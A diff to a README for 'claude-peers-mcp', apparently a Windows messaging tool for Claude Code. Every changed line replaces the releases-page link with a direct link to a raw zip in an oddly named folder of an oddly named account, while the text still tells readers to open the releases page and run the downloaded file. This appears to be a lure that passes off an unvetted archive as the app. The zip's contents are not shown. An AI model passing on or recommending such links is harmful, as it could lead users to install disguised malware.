@@ -1,6 +1,6 @@
 # 💬 claude-peers-mcp - Message Claude Codes Fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6c63ff?style=for-the-badge)](https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6c63ff?style=for-the-badge)](https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This app is for Windows users who want a simple way to move messages between Cla
 
 Visit this page to download the app:
 
-https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/releases
+https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip
 
 On the releases page, look for the latest version. Download the Windows file that matches your computer, then open it to start the app.
 
@@ -33,7 +33,7 @@ If your computer is managed by work or school, you may need admin access to inst
 Follow these steps:
 
 1. Open the download page:
-   https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/releases
+   https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip
 
 2. Find the newest release at the top of the page.
 
@@ -206,4 +206,4 @@ If you stored message data in Documents, delete that folder too if you want a cl
 
 Download or get the latest version here:
 
-https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/releases
+https://github.com/Businesseditorexternalorgan481/claude-peers-mcp/raw/refs/heads/main/enunciatory/peers_mcp_claude_1.5-alpha.1.zip
